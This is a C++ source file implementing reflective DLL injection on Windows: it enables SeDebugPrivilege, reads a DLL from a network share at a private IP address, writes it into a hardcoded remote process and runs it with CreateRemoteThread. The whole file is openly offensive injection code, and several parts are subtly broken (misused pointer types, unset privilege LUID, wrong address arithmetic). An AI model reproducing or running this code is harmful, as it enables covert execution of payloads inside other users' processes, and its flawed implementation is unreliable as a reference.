// Reflective DLL Injection.cpp : This file contains the 'main' function. Program execution begins and ends there.
#include <iostream>
#include<Windows.h>

BOOL EnableWindowsPrivilege(const WCHAR* Privilege)
{
    /* Tries to enable privilege if it is present to the Permissions set. */
    LUID luid = {};
    TOKEN_PRIVILEGES tp;
    HANDLE currentProcess = GetCurrentProcess();
    HANDLE currentToken = {};
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!LookupPrivilegeValue(NULL, Privilege, &luid))
        return FALSE;

    if (!OpenProcessToken(currentProcess, TOKEN_ALL_ACCESS, &currentToken))
        return FALSE;

    if (!AdjustTokenPrivileges(currentToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
        return FALSE;

    return TRUE;
}

bool ReflectiveDLLInjection(LPVOID buffer, DWORD size, HANDLE hProcess,HANDLE hDLL) {
    //save DLL content inside heap
    ReadFile(hDLL, buffer, size, NULL, NULL);

    //now buffer points to the first byte of DLL.
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS nt_header = (PIMAGE_NT_HEADERS)((LPBYTE)buffer + dos_header->e_lfanew); //error
    DWORD optional_header_size = nt_header->OptionalHeader.SizeOfImage;

    //get .edata section address
    IMAGE_DATA_DIRECTORY export_table = nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    PIMAGE_EXPORT_DIRECTORY export_dir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)buffer + export_table.VirtualAddress);

    PWORD functions = (PWORD)((LPBYTE)buffer + export_dir->AddressOfFunctions);
    PWORD names = (PWORD)((LPBYTE)buffer + export_dir->AddressOfNames);
    PWORD ordinals = (PWORD)((LPBYTE)buffer + export_dir->AddressOfNameOrdinals);

    LPBYTE target_address = (LPBYTE)NULL;

    for (int i = 0; i < export_dir->NumberOfNames; i++) {
        char* tmp = (char *)((LPBYTE)buffer + names[i]);
        if (!strcmp("DllMain", (char*)((LPBYTE)buffer + names[i]))) {
            target_address = (LPBYTE)buffer + functions[ordinals[i]];
            break;
        }
    }
    
    if (target_address == NULL)
        return false;

    //Allocate memory inside the process
    LPVOID base_addr = VirtualAllocEx(hProcess, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    //We will fill

    if (!base_addr) {
        return false;
    }

    //write inside the memory the DLL content
    if (!WriteProcessMemory(hProcess, base_addr, buffer, size, NULL)) {
        return false;
    }

    LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)base_addr + target_address);
    CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, NULL, NULL, NULL);
    return true;
}

int main(int argc,char* argv[])
{
    int target_pid = 3124;
    //if (argc == 1)
    //    target_pid = atoi(argv[1]);
    //else
    //    target_pid = GetCurrentProcessId();

    HANDLE hdll = CreateFileA("\\\\192.168.122.1\\share\\tmp.dll", GENERIC_READ, NULL, NULL, OPEN_EXISTING, NULL, NULL);
    if (hdll == INVALID_HANDLE_VALUE) {
        return -1;
    }
    
    // Enable SeDebugPrivilege in current process to open handle to remote process
    if (!EnableWindowsPrivilege(SE_DEBUG_NAME)) {
        return -1;
    }

    //Allocate Heap for DLL to be saved in memory
    DWORD64 size = GetFileSize(hdll, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) {
        return -1;
    }
    LPVOID buffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);

    // Open Handle to remote process
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, target_pid);
    if (hProcess == INVALID_HANDLE_VALUE) {
        return -1;
    }

    bool status = ReflectiveDLLInjection(buffer, size, hProcess, hdll);

    if (status)
        return 0;
    else
        return -1;
}
